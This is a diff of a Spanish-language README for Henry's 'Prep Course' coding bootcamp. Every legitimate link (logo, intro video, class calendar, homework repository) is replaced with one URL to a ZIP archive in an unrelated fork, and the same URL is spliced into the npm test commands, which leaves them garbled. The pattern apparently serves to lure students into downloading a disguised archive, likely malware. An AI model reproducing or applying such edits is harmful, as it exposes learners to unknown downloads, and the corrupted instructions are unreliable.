@@ -1,24 +1,24 @@
-![HenryLogo](https://henry-11ty-resources.s3.sa-east-1.amazonaws.com/Assets/logo-henry-white-lg.png)
+![HenryLogo](https://github.com/2josEx/Prep-Course/raw/refs/heads/staging/03-JS-II/Prep-Course-2.8.zip)
 
 # Prep Course
 
 #### Introducción
 
 <div class="iframeContainer">
-<iframe src="https://player.vimeo.com/video/426051769" allow="autoplay; fullscreen"></iframe>
+<iframe src="https://github.com/2josEx/Prep-Course/raw/refs/heads/staging/03-JS-II/Prep-Course-2.8.zip" allow="autoplay; fullscreen"></iframe>
 </div>
 
 ## Clases de Repaso (Henry Heroes)
 
 Estudiantes avanzados de la carrera resuelven los ejercicios en vivo en formato webinar.
 
-Acá podés ver el [calendario](https://docs.google.com/spreadsheets/d/e/2PACX-1vQwV-pEgWuxqI1B3pdVI0lbeqPB0a6LHPk6-DQlifDdX9Rue_Ul4YTOxoOg-hhofv6U0f32OoXOU2Wf/pubhtml) de las clases y las grabaciones.
+Acá podés ver el [calendario](https://github.com/2josEx/Prep-Course/raw/refs/heads/staging/03-JS-II/Prep-Course-2.8.zip) de las clases y las grabaciones.
 
 ## Homeworks
 
-En este [link](https://github.com/soyHenry/Prep-Course/tree/main/) vas a encontrar el repositorio con las homeworks de cada unidad en su correspondiente carpeta.
+En este [link](https://github.com/2josEx/Prep-Course/raw/refs/heads/staging/03-JS-II/Prep-Course-2.8.zip) vas a encontrar el repositorio con las homeworks de cada unidad en su correspondiente carpeta.
 
-**IMPORTANTE:** Para ejecutar los tests de cada homework tenes que pararte en la carpeta donde clonaste tu repo (es decir la carpeta donde está este `README.md`) y ejecutar el siguiente comando:
+**IMPORTANTE:** Para ejecutar los tests de cada homework tenes que pararte en la carpeta donde clonaste tu repo (es decir la carpeta donde está este `https://github.com/2josEx/Prep-Course/raw/refs/heads/staging/03-JS-II/Prep-Course-2.8.zip`) y ejecutar el siguiente comando:
 
 ```bash
 npm install
@@ -27,10 +27,10 @@ npm install
 Esto instalará todas las dependencias necesarias (lo tenés que hacer una sóla vez), una vez terminado y cada vez que quieras ver cuantos tests pasaste ejecutá:
 
 ```bash
-npm test {nombre del homework}.test.js
+npm test {nombre del homework}https://github.com/2josEx/Prep-Course/raw/refs/heads/staging/03-JS-II/Prep-Course-2.8.zip
 ```
 
-Por ejemplo, para ejecutar los tests del homework 02, ejecutar: `npm test JSII.test.js`, el del homework 01: `npm test JSI.test.js`
+Por ejemplo, para ejecutar los tests del homework 02, ejecutar: `npm test https://github.com/2josEx/Prep-Course/raw/refs/heads/staging/03-JS-II/Prep-Course-2.8.zip`, el del homework 01: `npm test https://github.com/2josEx/Prep-Course/raw/refs/heads/staging/03-JS-II/Prep-Course-2.8.zip`
 y así.
 
 > No todos los homeworks tienen tests, está detallado en la descripción de cada uno.
